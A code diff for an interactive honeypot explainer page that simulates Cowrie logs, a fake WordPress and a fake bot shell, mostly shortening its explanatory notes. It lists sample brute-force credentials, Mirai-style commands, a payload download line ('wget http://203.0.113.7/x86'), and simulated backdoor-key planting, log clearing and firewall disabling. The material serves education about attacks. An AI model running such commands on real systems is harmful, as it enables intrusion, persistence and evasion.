@@ -51,38 +51,12 @@
 
   // ---------- inside the trap: the ports ----------
   const PORTS = {
-    22: {
-      end: "cowrie (fake)",
-      title: "SSH, answered by Cowrie",
-      text: "The door every bot tries first. Cowrie completes the handshake as <code>OpenSSH 8.9p1 Ubuntu</code>, logs every username and password, and lets some guesses \"work\" so it can watch what the bot does next.",
-      log: [
-        { eventid: "cowrie.login.failed", username: "root", password: "admin", src_ip: "203.0.113.57" },
-        { eventid: "cowrie.login.failed", username: "root", password: "root", src_ip: "203.0.113.57" },
-        { eventid: "cowrie.login.success", username: "root", password: "123456", src_ip: "203.0.113.57" },
-      ],
-    },
-    23: {
-      end: "cowrie (fake)",
-      title: "Telnet, answered by Cowrie",
-      text: "Old, unencrypted remote login that nothing modern should use. It's mostly hit by IoT botnets in the Mirai family, which hunt for cameras and routers still on their factory passwords. They announce themselves with a <code>busybox</code> check.",
-      log: [
-        { eventid: "cowrie.login.success", username: "admin", password: "admin", src_ip: "198.51.100.23" },
-        { eventid: "cowrie.command.input", input: "enable; system; shell; sh", src_ip: "198.51.100.23" },
-        { eventid: "cowrie.command.input", input: "/bin/busybox ECCHI", src_ip: "198.51.100.23" },
-      ],
-    },
-    80: {
-      end: "fake WordPress",
-      title: "A website, answered by a fake WordPress",
-      text: "A tiny Python server that claims to be Apache running an out-of-date WordPress. It serves a login page and a home page and returns 404 for everything else, but it writes down every request. Try it.",
-      log: null,
-    },
-    22222: {
-      end: "real sshd",
-      title: "The only real door",
-      text: "My own admin login, moved off port 22 so bots never meet it. It accepts SSH keys only, never passwords. The honeypot doesn't log it, because it isn't bait.",
-      log: null,
-    },
+    22: { end: "cowrie (fake)", title: "SSH → fake shell", text: "Logs every password. Lets some in.",
+      rows: [["✗", "root", "admin"], ["✗", "root", "root"], ["✓", "root", "123456"]] },
+    23: { end: "cowrie (fake)", title: "Telnet → fake shell", text: "IoT botnets hunting cameras and routers.",
+      rows: [["✓", "admin", "admin"], ["›", "enable; system; shell; sh", ""], ["›", "/bin/busybox ECCHI", ""]] },
+    80: { end: "fake WordPress", title: "Web → fake WordPress", text: "Ask it for a file. It writes down every request.", rows: null },
+    22222: { end: "real sshd", title: "The only real door", text: "My login. Keys only. Bots never see it.", rows: null },
   };
   const detail = $(".port-detail"), probe = $(".probe"), laneEnd = $(".lane-end");
   function showPort(port) {
@@ -90,21 +64,19 @@
     $$(".ports button").forEach(b => b.setAttribute("aria-selected", String(b.dataset.port === String(port))));
     laneEnd.textContent = p.end;
     $(".lane").classList.toggle("real", port === "22222");
-    detail.innerHTML = `<h3>${p.title}</h3><p>${p.text}</p>` +
-      (p.log ? `<pre>${p.log.map(l => esc(JSON.stringify({ ...l, timestamp: stamp() }))).join("\n")}</pre>` : "");
+    detail.innerHTML = `<h3>${p.title}</h3><p>${p.text}</p>` + (p.rows ? `<ul class="creds">${p.rows.map(([m, a, b]) =>
+      `<li class="${m === "✓" ? "ok" : m === "✗" ? "no" : "cmd"}"><b>${m}</b><code>${esc(a)}</code>${b ? `<code>${esc(b)}</code>` : ""}</li>`).join("")}</ul>` : "");
     probe.hidden = port !== "80";
     if (port === "80") sendProbe();
   }
   $$(".ports button").forEach(b => b.addEventListener("click", () => showPort(b.dataset.port)));
 
   const PATH_NOTES = {
-    "/": "The home page. Its generator tag claims WordPress 6.1.1, an outdated version. That's part of the bait.",
-    "/.env": "On a real site, this file often holds database passwords and API keys. It's the single most-requested secret on the web.",
-    "/wp-login.php": "A WordPress login form. Bots POST thousands of password guesses here, and every one is logged.",
-    "/wp-admin": "Redirects bots to the same fake login.",
-    "/.git/config": "On a real site, an exposed .git folder can hand over the entire source code, history and all.",
-    "/backup.sql": "A forgotten database dump: every customer record in one download.",
-    "/phpinfo.php": "A debug page that lists the server's whole configuration.",
+    "/": "Claims to be an old WordPress. Bait.",
+    "/.env": "Real sites leak passwords here.",
+    "/wp-login.php": "Bots try thousands of passwords here.",
+    "/wp-admin": "Same fake login.",
+    "/.git/config": "Real sites leak their source code here.",
   };
   const probeInput = $("#probe-path"), probeOut = $(".probe-out");
   function sendProbe() {
@@ -115,7 +87,7 @@
     const body = bare === "/" ? '<!DOCTYPE html><html><head><title>Welcome</title><meta name="generator" content="WordPress 6.1.1">…'
       : ok ? "<!DOCTYPE html><html><head><title>Log In &lsaquo; Site &#8212; WordPress</title>…" : "<html><body><h1>Not Found</h1></body></html>";
     const entry = { ts: stamp(), src_ip: "you", method: "GET", path, version: "HTTP/1.1", user_agent: navigator.userAgent.slice(0, 60) + "…" };
-    const note = PATH_NOTES[bare] || "Not a path we planted, and it's still logged. Unknown paths show what bots are hunting for this week.";
+    const note = PATH_NOTES[bare] || "Not planted. Still logged.";
     probeOut.innerHTML =
       `<span class="dim">HTTP/1.1 ${ok ? "200 OK" : "404 Not Found"}\nServer: Apache/2.4.41 (Ubuntu)\nContent-Type: text/html; charset=UTF-8</span>\n\n${esc(body)}\n\n` +
       `<span class="hl">→ appended to requests.jsonl</span>\n${esc(JSON.stringify(entry))}\n\n<span class="note">◆ ${esc(note)}</span>`;
@@ -249,38 +221,38 @@
         o = cmd === "wget"
           ? `--${new Date().toISOString().slice(0, 19).replace("T", " ")}--  ${url}\nConnecting to ${url.split("/")[2]}:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 1048576 (1.0M) [application/octet-stream]\nSaving to: '${name}'\n\n${name}            100%[===================>]   1.00M  3.21MB/s    in 0.3s`
           : (oi >= 0 ? "  % Total    % Received % Xferd  Average Speed   Time\n100 1024k  100 1024k    0     0  3214k      0  0:00:01" : "\x7fELF…");
-        notes.push("Captured. The honeypot keeps the file on the server and sends home only its SHA-256 fingerprint. It never runs.");
+        notes.push("Captured. Only its fingerprint leaves the server.");
         break;
       }
       case "tftp": case "ftpget": o = `${cmd}: timeout`; break;
       case "chmod": if (args.length < 2) o = "chmod: missing operand"; break;
       case "sh": case "bash":
         if (args[0] === "-c") return run(args.slice(1).join(" ").replace(/^['"]|['"]$/g, "").split(/\s+/));
-        if (args[0] && downloads.has(resolve(args[0]))) notes.push("Cowrie pretends the script ran. Nothing actually executed.");
+        if (args[0] && downloads.has(resolve(args[0]))) notes.push("Fake run. Nothing executed.");
         else if (args[0]) o = `${cmd}: ${args[0]}: No such file or directory`;
         break;
       case "crontab": if (flags.includes("l")) o = "no crontab for root"; break;
       case "history":
-        if (flags.includes("c")) { hist = []; notes.push("History cleared here, but not in Cowrie's log. Every keystroke was already recorded."); }
+        if (flags.includes("c")) { hist = []; notes.push("Too late. Every keystroke is already logged."); }
         else o = hist.map((h, i) => `${String(i + 1).padStart(5)}  ${h}`).join("\n");
         break;
       case "rm": args.filter(a => !a.startsWith("-")).forEach(a => downloads.delete(resolve(a))); break;
-      case "passwd": o = "passwd: password updated successfully"; notes.push("Bots change the password to lock out other bots. In a fake shell, it changes nothing."); break;
+      case "passwd": o = "passwd: password updated successfully"; notes.push("Locks out rival bots. Changes nothing here."); break;
       case "useradd": case "usermod": case "chpasswd": case "pkill": case "killall": case "kill": case "chattr": case "mkdir": case "touch": break;
       case "systemctl": case "iptables": break;
       case "ufw": o = args[0] === "disable" ? "Firewall stopped and disabled on system startup" : "Status: active";
-        if (args[0] === "disable") notes.push("A fake firewall inside a fake shell. The real one sits outside it, untouched.");
+        if (args[0] === "disable") notes.push("Fake firewall. The real one is untouched.");
         break;
       case "busybox": case "/bin/busybox":
         o = args[0] ? `${args[0]}: applet not found` : "BusyBox v1.30.1 (Ubuntu 1:1.30.1-7ubuntu3) multi-call binary.";
-        if (args[0]) notes.push("A Mirai-family fingerprint: the bot checks whether busybox exists before it picks a payload.");
+        if (args[0]) notes.push("Mirai-style botnet fingerprint.");
         break;
       case "ping": o = `PING ${args.find(a => !a.startsWith("-")) || ""} 56(84) bytes of data.\n64 bytes: icmp_seq=1 ttl=57 time=11.2 ms\n64 bytes: icmp_seq=2 ttl=57 time=10.9 ms`; break;
       case "enable": case "system": case "shell": case "true": case "export": case "unset": break;
       case "help": notes.push("Real bots don't ask for help. Try: uname -a · cat /proc/cpuinfo · wget http://203.0.113.7/x86 · crontab -l · passwd · history -c"); break;
       default:
         if (/^(\.{0,2}\/|\/)/.test(cmd) && downloads.has(resolve(cmd))) {
-          notes.push("Cowrie fakes the run. The binary never executes; the bot just sees a quiet prompt.");
+          notes.push("Fake run. Nothing executed.");
         } else o = `-bash: ${cmd}: command not found`;
     }
     return { o, notes };
@@ -322,7 +294,7 @@
       }
       notes.push(...first.notes);
       if (red) {
-        if (/authorized_keys/.test(red[2])) notes.push("A bot's own SSH key, planted so it can walk back in without a password.");
+        if (/authorized_keys/.test(red[2])) notes.push("Backdoor key planted.");
       } else if (lines.length) print(lines.join("\n"));
     }
     notes.forEach(n => print("◆ " + n, "note"));
@@ -331,9 +303,9 @@
   }
 
   // what the analysis sees
-  const counts = new Map(), techList = $(".tech-list"), logLine = $(".log-line");
+  const counts = new Map(), techList = $(".tech-list");
   function record(line) {
-    logLine.textContent = JSON.stringify({ eventid: "cowrie.command.input", input: line, session, src_ip: "203.0.113.57", timestamp: stamp() });
+    dispatchEvent(new CustomEvent("bot-command", { detail: techniques(line).length }));
     const hits = techniques(line);
     for (const [id, name, tactic] of hits) {
       counts.set(id, { name, tactic, n: (counts.get(id)?.n || 0) + 1 });
@@ -376,7 +348,7 @@
   runBtn.addEventListener("click", async () => {
     if (busy) return;
     busy = true; runBtn.disabled = true; input.readOnly = true;
-    print("◆ Replaying a typical bot session: look around, download, persist, cover tracks.", "note");
+    print("◆ Typical bot: look, download, persist, hide.", "note");
     for (const line of BOT) { await typeAndRun(line); await sleep(reduceMotion ? 0 : 650); }
     busy = false; runBtn.disabled = false; input.readOnly = false;
   });
@@ -407,7 +379,6 @@
       <span class="sev ${i.sev}">${i.sev}${i.status === "warn" ? " · warn" : ""}</span>
       <span class="cost">−${i.cost}</span>
       <strong>${esc(i.title)}</strong>
-      <span class="why">${esc(i.why)}</span>
       <code class="fix">${esc(i.fix)}</code>
       <span class="live ${i.live ? "yes" : "no"}">${i.live ? "Fixed on the live site" : "Live: waiting on two DNS records"}</span>
     </button></li>`).join("");
